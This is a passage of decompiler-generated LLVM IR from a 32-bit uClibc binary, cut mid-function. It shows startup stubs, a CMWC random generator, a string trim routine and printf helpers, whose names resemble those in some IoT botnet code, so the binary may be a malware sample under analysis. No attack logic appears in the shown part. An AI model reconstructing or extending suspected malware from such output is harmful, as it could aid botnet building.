  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8059164.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8059164.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8059164.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8059ae0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8059164.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8059ae0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_8058124.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_8059138.6, align 8
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134532189, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134562952, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_8059b20.7, align 32
  %v1_8048199 = add i32 %arg1, -1640531527
  store i32 %v1_8048199, i32* @global_var_8059b24.8, align 4
  %v1_80481a6 = add i32 %arg1, 1013904242
  store i32 %v1_80481a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80481a6, i32* @global_var_8059b28.9, align 8
  br label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %entry, %dec_label_pc_80481b9
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481e9, %dec_label_pc_80481b9 ]
  %v1_80481bf = add nsw i32 %storemerge5, -3
  store i32 %v1_80481bf, i32* %eax.global-to-local, align 4
  %v1_80481c2 = mul nuw nsw i32 %v1_80481bf, 4
  %v2_80481c2 = add i32 %v1_80481c2, ptrtoint (i32* @global_var_8059b20.7 to i32)
  %v3_80481c2 = inttoptr i32 %v2_80481c2 to i32*
  %v4_80481c2 = load i32, i32* %v3_80481c2, align 4
  %v1_80481cc = add nsw i32 %storemerge5, -2
  store i32 %v1_80481cc, i32* %eax.global-to-local, align 4
  %v1_80481cf = mul nuw nsw i32 %v1_80481cc, 4
  %v2_80481cf = add i32 %v1_80481cf, ptrtoint (i32* @global_var_8059b20.7 to i32)
  %v3_80481cf = inttoptr i32 %v2_80481cf to i32*
  %v4_80481cf = load i32, i32* %v3_80481cf, align 4
  %v2_80481d6 = xor i32 %v4_80481cf, %v4_80481c2
  %v2_80481db = xor i32 %storemerge5, -1640531527
  %v1_80481dd = xor i32 %v2_80481db, %v2_80481d6
  store i32 %v1_80481dd, i32* %eax.global-to-local, align 4
  %v2_80481e2 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e2 = add i32 %v2_80481e2, ptrtoint (i32* @global_var_8059b20.7 to i32)
  %v4_80481e2 = inttoptr i32 %v3_80481e2 to i32*
  store i32 %v1_80481dd, i32* %v4_80481e2, align 4
  %v4_80481e9 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481e9, 4096
  br i1 %exitcond, label %dec_label_pc_80481f5, label %dec_label_pc_80481b9

dec_label_pc_80481f5:                             ; preds = %dec_label_pc_80481b9
  %v0_80481f6 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481f6

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481b9, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048213 = load i32, i32* @global_var_8059850.10, align 16
  %v1_8048218 = add i32 %v0_8048213, 1
  %v1_8048219 = urem i32 %v1_8048218, 4096
  store i32 %v1_8048219, i32* @global_var_8059850.10, align 16
  %v1_8048228 = mul nuw nsw i32 %v1_8048219, 4
  %v2_8048228 = add i32 %v1_8048228, ptrtoint (i32* @global_var_8059b20.7 to i32)
  %v3_8048228 = inttoptr i32 %v2_8048228 to i32*
  %v4_8048228 = load i32, i32* %v3_8048228, align 4
  %v7_8048245 = udiv i32 %v4_8048228, 228675
  store i32 %v7_8048245, i32* @global_var_805984c.11, align 4
  br i1 true, label %dec_label_pc_8048295, label %dec_label_pc_8048287

dec_label_pc_8048287:                             ; preds = %entry
  br label %dec_label_pc_8048295

dec_label_pc_8048295:                             ; preds = %entry, %dec_label_pc_8048287
  store i32 %v1_8048219, i32* @ecx, align 4
  %v1_80482aa = mul nuw nsw i32 %v1_8048219, 4
  %v2_80482aa = add i32 %v1_80482aa, ptrtoint (i32* @global_var_8059b20.7 to i32)
  %v3_80482aa = inttoptr i32 %v2_80482aa to i32*
  %v4_80482aa = load i32, i32* %v3_80482aa, align 4
  ret i32 %v4_80482aa

; uselistorder directives
  uselistorder i32 %v1_8048219, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8048295, { 1, 0 }
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp10 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80482ba = load i32, i32* @edi, align 4
  store i32 %v0_80482ba, i32* %stack_var_-8, align 4
  %v4_80482c5 = ptrtoint i8* %tmp10 to i32
  store i1 false, i1* @df, align 1
  %v3_80482d6 = call i32 @_strlen(i8* %tmp10)
  %v1_80482dd = add i32 %v3_80482d6, -1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e3:                             ; preds = %dec_label_pc_80482e6
  %v4_80482e3 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e6:                             ; preds = %entry, %dec_label_pc_80482e3
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e3, %dec_label_pc_80482e3 ]
  %v6_80482e9 = add i32 %stack_var_-16.0, %v4_80482c5
  %v1_80482ec = inttoptr i32 %v6_80482e9 to i8*
  %v2_80482ec = load i8, i8* %v1_80482ec, align 1
  %v2_80482ee = sext i8 %v2_80482ec to i32
  %v1_80482f5 = call i32 @isspace(i32 %v2_80482ee)
  %v1_80482fd = icmp eq i32 %v1_80482f5, 0
  %v1_80482ff = icmp eq i1 %v1_80482fd, false
  br i1 %v1_80482ff, label %dec_label_pc_80482e3, label %dec_label_pc_8048306.preheader

dec_label_pc_8048306.preheader:                   ; preds = %dec_label_pc_80482e6
  %v5_804830c24 = icmp slt i32 %v1_80482dd, %stack_var_-16.0
  br i1 %v5_804830c24, label %dec_label_pc_8048329, label %dec_label_pc_804830e.lr.ph

dec_label_pc_804830e.lr.ph:                       ; preds = %dec_label_pc_8048306.preheader
  br label %dec_label_pc_804830e

dec_label_pc_8048303:                             ; preds = %dec_label_pc_804830e
  %v5_8048303 = add i32 %stack_var_-12.0.in25, -1
  %v5_804830c = icmp slt i32 %v5_8048303, %stack_var_-16.0
  br i1 %v5_804830c, label %dec_label_pc_8048329, label %dec_label_pc_804830e

dec_label_pc_804830e:                             ; preds = %dec_label_pc_804830e.lr.ph, %dec_label_pc_8048303
  %stack_var_-12.0.in25 = phi i32 [ %v1_80482dd, %dec_label_pc_804830e.lr.ph ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v6_8048311 = add i32 %stack_var_-12.0.in25, %v4_80482c5
  %v1_8048314 = inttoptr i32 %v6_8048311 to i8*
  %v2_8048314 = load i8, i8* %v1_8048314, align 1
  %v2_8048316 = sext i8 %v2_8048314 to i32
  %v1_804831d = call i32 @isspace(i32 %v2_8048316)
  %v1_8048325 = icmp eq i32 %v1_804831d, 0
  %v1_8048327 = icmp eq i1 %v1_8048325, false
  br i1 %v1_8048327, label %dec_label_pc_8048303, label %dec_label_pc_8048329

dec_label_pc_8048329:                             ; preds = %dec_label_pc_8048303, %dec_label_pc_804830e, %dec_label_pc_8048306.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_80482dd, %dec_label_pc_8048306.preheader ], [ %stack_var_-12.0.in25, %dec_label_pc_804830e ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v7_804835118 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  br i1 %v7_804835118, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048331:                             ; preds = %dec_label_pc_8048329, %dec_label_pc_8048331
  %v6_804835b20 = phi i32 [ %v6_804835b, %dec_label_pc_8048331 ], [ %v4_80482c5, %dec_label_pc_8048329 ]
  %storemerge.in19 = phi i32 [ %v5_8048348, %dec_label_pc_8048331 ], [ %stack_var_-16.0, %dec_label_pc_8048329 ]
  %v6_8048341 = add i32 %storemerge.in19, %v4_80482c5
  %v1_8048344 = inttoptr i32 %v6_8048341 to i8*
  %v2_8048344 = load i8, i8* %v1_8048344, align 1
  %v3_8048346 = inttoptr i32 %v6_804835b20 to i8*
  store i8 %v2_8048344, i8* %v3_8048346, align 1
  %v5_8048348 = add i32 %storemerge.in19, 1
  %v7_8048351 = icmp sgt i32 %v5_8048348, %stack_var_-12.0.in.lcssa
  %v2_8048359 = sub i32 %v5_8048348, %stack_var_-16.0
  %v6_804835b = add i32 %v2_8048359, %v4_80482c5
  br i1 %v7_8048351, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048353:                             ; preds = %dec_label_pc_8048331, %dec_label_pc_8048329
  %v6_804835b.lcssa = phi i32 [ %v4_80482c5, %dec_label_pc_8048329 ], [ %v6_804835b, %dec_label_pc_8048331 ]
  %v22_804835b = inttoptr i32 %v6_804835b.lcssa to i8*
  store i8 0, i8* %v22_804835b, align 1
  %v3_8048361 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048361, i32* @edi, align 4
  ret i32 %v6_804835b.lcssa

; uselistorder directives
  uselistorder i32 %v6_804835b.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048348, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_8048303, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_80482dd, { 2, 1, 0 }
  uselistorder i32 %v4_80482c5, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp10, { 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8048331, { 1, 0 }
  uselistorder label %dec_label_pc_8048329, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830e, { 1, 0 }
  uselistorder label %dec_label_pc_80482e6, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_804839e

dec_label_pc_804838b:                             ; preds = %entry
  %v3_8048396 = bitcast i8* %stack_var_8 to i32*
  %v4_8048396 = call i32 @__libc_write(i32 1, i32* %v3_8048396, i32 1)
  br label %dec_label_pc_804839e

dec_label_pc_804839e:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_804839f = phi i32 [ %tmp3, %dec_label_pc_8048372 ], [ %v4_8048396, %dec_label_pc_804838b ]
  ret i32 %v0_804839f

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804839e, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp23 = icmp slt i32 %arg3, 1
  br i1 %tmp23, label %dec_label_pc_8048400, label %dec_label_pc_80483ba

dec_label_pc_80483ba:                             ; preds = %entry
  %v4_80483c1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c1, i32* @edx, align 4
  %v2_80483d254 = load i8, i8* %arg2, align 1
  %v3_80483d255 = zext i8 %v2_80483d254 to i32
  %v5_80483d256 = and i32 %v4_80483c1, -256
  %v6_80483d257 = or i32 %v3_80483d255, %v5_80483d256
  %v4_80483d458 = icmp eq i8 %v2_80483d254, 0
  %v1_80483d659 = icmp eq i1 %v4_80483d458, false
  br i1 %v1_80483d659, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483c9:                             ; preds = %dec_label_pc_80483ba, %dec_label_pc_80483c9
  %v6_80483d262 = phi i32 [ %v6_80483d2, %dec_label_pc_80483c9 ], [ %v6_80483d257, %dec_label_pc_80483ba ]
  %v4_80483cf61 = phi i32 [ %v5_80483cc, %dec_label_pc_80483c9 ], [ %v4_80483c1, %dec_label_pc_80483ba ]
  %stack_var_-12.060 = phi i32 [ %v4_80483c9, %dec_label_pc_80483c9 ], [ 0, %dec_label_pc_80483ba ]
  %v4_80483c9 = add i32 %stack_var_-12.060, 1
  %v5_80483cc = add i32 %v4_80483cf61, 1
  %v22_80483cc = inttoptr i32 %v5_80483cc to i8*
  store i32 %v5_80483cc, i32* @edx, align 4
  %v2_80483d2 = load i8, i8* %v22_80483cc, align 1
  %v3_80483d2 = zext i8 %v2_80483d2 to i32
  %v5_80483d2 = and i32 %v6_80483d262, -256
  %v6_80483d2 = or i32 %v3_80483d2, %v5_80483d2
  %v4_80483d4 = icmp eq i8 %v2_80483d2, 0
  %v1_80483d6 = icmp eq i1 %v4_80483d4, false
  br i1 %v1_80483d6, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483d8:                             ; preds = %dec_label_pc_80483c9, %dec_label_pc_80483ba
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483ba ], [ %v4_80483c9, %dec_label_pc_80483c9 ]
  %v5_80483de = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483de, label %dec_label_pc_80483e9, label %dec_label_pc_80483ef

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_80483d8
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483ec = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483ef

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_80483d8, %dec_label_pc_80483e9
  %storemerge = phi i32 [ %v5_80483ec, %dec_label_pc_80483e9 ], [ 0, %dec_label_pc_80483d8 ]
  %v1_80483f2 = and i32 %arg4, 2
  %tmp24 = mul nuw nsw i32 %v1_80483f2, 8
  %tmp25 = or i32 %tmp24, 32
  br label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_80483ef, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483ef ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp25, %dec_label_pc_80483ef ]
  %v1_8048403 = urem i32 %arg4, 2
  %v2_8048403 = icmp eq i32 %v1_8048403, 0
  %v1_8048408 = icmp eq i1 %v2_8048403, false
  %.pre9 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048408, label %dec_label_pc_804844a.preheader, label %dec_label_pc_8048423.preheader

dec_label_pc_8048423.preheader:                   ; preds = %dec_label_pc_8048400
  %tmp2647 = icmp slt i32 %stack_var_12.0, 1
  %tmp2748 = icmp eq i1 %tmp2647, false
  br i1 %tmp2748, label %dec_label_pc_804840c.lr.ph, label %dec_label_pc_804844a.preheader

dec_label_pc_804840c.lr.ph:                       ; preds = %dec_label_pc_8048423.preheader
  br label %dec_label_pc_804840c

dec_label_pc_804840c:                             ; preds = %dec_label_pc_804840c.lr.ph, %dec_label_pc_804840c
  %stack_var_-20.050 = phi i32 [ 0, %dec_label_pc_804840c.lr.ph ], [ %v4_804841d, %dec_label_pc_804840c ]
  %stack_var_12.149 = phi i32 [ %stack_var_12.0, %dec_label_pc_804840c.lr.ph ], [ %v4_8048420, %dec_label_pc_804840c ]
  %v3_8048415 = call i32 @printchar(i32* %.pre9, i32 %stack_var_-16.0)
  %v4_804841d = add i32 %stack_var_-20.050, 1
  %v4_8048420 = add i32 %stack_var_12.149, -1
  %tmp26 = icmp slt i32 %v4_8048420, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_804840c, label %dec_label_pc_804844a.preheader

dec_label_pc_804844a.preheader:                   ; preds = %dec_label_pc_8048423.preheader, %dec_label_pc_804840c, %dec_label_pc_8048400
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048400 ], [ %stack_var_12.0, %dec_label_pc_8048423.preheader ], [ %v4_8048420, %dec_label_pc_804840c ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048400 ], [ 0, %dec_label_pc_8048423.preheader ], [ %v4_804841d, %dec_label_pc_804840c ]
  %v2_804844d36 = load i8, i8* %arg2, align 1
  %v4_804844f40 = icmp eq i8 %v2_804844d36, 0
  %v1_804845141 = icmp eq i1 %v4_804844f40, false
  br i1 %v1_804845141, label %dec_label_pc_804842b.lr.ph, label %dec_label_pc_804846c.preheader

dec_label_pc_804842b.lr.ph:                       ; preds = %dec_label_pc_804844a.preheader
  %v4_804844a35 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804842b

dec_label_pc_804842b:                             ; preds = %dec_label_pc_804842b.lr.ph, %dec_label_pc_804842b
  %v4_804844a44 = phi i32 [ %v4_804844a35, %dec_label_pc_804842b.lr.ph ], [ %v5_8048447, %dec_label_pc_804842b ]
  %stack_var_-20.143 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804842b.lr.ph ], [ %v4_8048444, %dec_label_pc_804842b ]
  %stack_var_8.042 = phi i8* [ %arg2, %dec_label_pc_804842b.lr.ph ], [ %v22_8048447, %dec_label_pc_804842b ]
  %v2_804842e = load i8, i8* %stack_var_8.042, align 1
  %v3_804842e = zext i8 %v2_804842e to i32
  %v3_804843c = call i32 @printchar(i32* %.pre9, i32 %v3_804842e)
  %v4_8048444 = add i32 %stack_var_-20.143, 1
  %v5_8048447 = add i32 %v4_804844a44, 1
  %v22_8048447 = inttoptr i32 %v5_8048447 to i8*
  %v2_804844d = load i8, i8* %v22_8048447, align 1
  %v4_804844f = icmp eq i8 %v2_804844d, 0
  %v1_8048451 = icmp eq i1 %v4_804844f, false
  br i1 %v1_8048451, label %dec_label_pc_804842b, label %dec_label_pc_804846c.preheader

dec_label_pc_804846c.preheader:                   ; preds = %dec_label_pc_804842b, %dec_label_pc_804844a.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804844a.preheader ], [ %v4_8048444, %dec_label_pc_804842b ]
  %tmp2831 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp2932 = icmp eq i1 %tmp2831, false
  br i1 %tmp2932, label %dec_label_pc_8048455.lr.ph, label %dec_label_pc_8048472

dec_label_pc_8048455.lr.ph:                       ; preds = %dec_label_pc_804846c.preheader
  br label %dec_label_pc_8048455

dec_label_pc_8048455:                             ; preds = %dec_label_pc_8048455.lr.ph, %dec_label_pc_8048455
  %stack_var_-20.234 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048455.lr.ph ], [ %v4_8048466, %dec_label_pc_8048455 ]
  %stack_var_12.333 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_8048455.lr.ph ], [ %v4_8048469, %dec_label_pc_8048455 ]
  %v3_804845e = call i32 @printchar(i32* %.pre9, i32 %stack_var_-16.0)
  %v4_8048466 = add i32 %stack_var_-20.234, 1
  %v4_8048469 = add i32 %stack_var_12.333, -1
  %tmp28 = icmp slt i32 %v4_8048469, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_8048455, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804846c.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804846c.preheader ], [ %v4_8048466, %dec_label_pc_8048455 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048447, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483cc, { 1, 2, 0 }
  uselistorder i32 %v4_80483c1, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_8048455, { 1, 0 }
  uselistorder label %dec_label_pc_804842b, { 1, 0 }
  uselistorder label %dec_label_pc_804844a.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804840c, { 1, 0 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
  uselistorder label %dec_label_pc_80483c9, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804848e = sext i32 %tmp35 to i64
  %v4_8048491 = icmp eq i32 %tmp35, 0
  %v5_8048491 = icmp slt i32 %tmp35, 0
  %v1_8048495 = icmp eq i1 %v4_8048491, false
  br i1 %v1_8048495, label %dec_label_pc_80484bc, label %dec_label_pc_8048497

dec_label_pc_8048497:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484ac = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048597

dec_label_pc_80484bc:                             ; preds = %entry
  %v4_80484bc = icmp eq i32 %tmp28, 0
  br i1 %v4_80484bc, label %dec_label_pc_80484dd, label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_80484bc
  %v12_80484c2 = icmp eq i32 %tmp27, 10
  %v1_80484c6 = icmp eq i1 %v12_80484c2, false
  br i1 %v1_80484c6, label %dec_label_pc_80484dd, label %dec_label_pc_80484c8

dec_label_pc_80484c8:                             ; preds = %dec_label_pc_80484c2
  %v1_80484cc = icmp eq i1 %v5_8048491, false
  br i1 %v1_80484cc, label %dec_label_pc_80484dd, label %dec_label_pc_80484ce

dec_label_pc_80484ce:                             ; preds = %dec_label_pc_80484c8
  %v1_80484d8 = sub i32 0, %tmp35
  %v5_80484da = sext i32 %v1_80484d8 to i64
  br label %dec_label_pc_80484dd

dec_label_pc_80484dd:                             ; preds = %dec_label_pc_80484c8, %dec_label_pc_80484c2, %dec_label_pc_80484bc, %dec_label_pc_80484ce
  %stack_var_-24.0 = phi i64 [ %v5_804848e, %dec_label_pc_80484bc ], [ %v5_804848e, %dec_label_pc_80484c2 ], [ %v5_804848e, %dec_label_pc_80484c8 ], [ %v5_80484da, %dec_label_pc_80484ce ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484bc ], [ 0, %dec_label_pc_80484c2 ], [ 0, %dec_label_pc_80484c8 ], [ 1, %dec_label_pc_80484ce ]
  %v15_80484e0 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804853e7 = trunc i64 %stack_var_-24.0 to i32
  %v5_804853e8 = icmp eq i32 %v4_804853e7, 0
  %v1_804854215 = icmp eq i1 %v5_804853e8, false
  br i1 %v1_804854215, label %dec_label_pc_80484ee.lr.ph, label %dec_label_pc_8048544

dec_label_pc_80484ee.lr.ph:                       ; preds = %dec_label_pc_80484dd
  %v5_80484f1 = sext i32 %tmp27 to i64
  br label %dec_label_pc_80484ee

dec_label_pc_80484ee:                             ; preds = %dec_label_pc_80484ee.lr.ph, %dec_label_pc_8048516
  %v3_804851618 = phi i8* [ %tmp48, %dec_label_pc_80484ee.lr.ph ], [ %v22_8048516, %dec_label_pc_8048516 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80484ee.lr.ph ], [ %v5_804853b, %dec_label_pc_8048516 ]
  %v6_80484fc = and i64 %stack_var_-24.116, 4294967295
  %v12_80484fc = udiv i64 %v6_80484fc, %v5_80484f1
  %v13_80484fc = trunc i64 %v12_80484fc to i32
  %v14_80484fc = urem i64 %v6_80484fc, %v5_80484f1
  %v5_8048501 = trunc i64 %v14_80484fc to i8
  %v7_8048508 = icmp sgt i8 %v5_8048501, 9
  br i1 %v7_8048508, label %dec_label_pc_804850a, label %dec_label_pc_8048516

dec_label_pc_804850a:                             ; preds = %dec_label_pc_80484ee
  %tmp52 = trunc i64 %v14_80484fc to i32
  %v5_804850d = add i32 %tmp52, %tmp
  %v1_8048510 = add i32 %v5_804850d, 198
  %v11_8048510 = trunc i32 %v1_8048510 to i8
  br label %dec_label_pc_8048516

dec_label_pc_8048516:                             ; preds = %dec_label_pc_80484ee, %dec_label_pc_804850a
  %stack_var_-36.0 = phi i8 [ %v11_8048510, %dec_label_pc_804850a ], [ %v5_8048501, %dec_label_pc_80484ee ]
  %v4_8048516 = ptrtoint i8* %v3_804851618 to i32
  %v5_8048516 = add i32 %v4_8048516, -1
  %v22_8048516 = inttoptr i32 %v5_8048516 to i8*
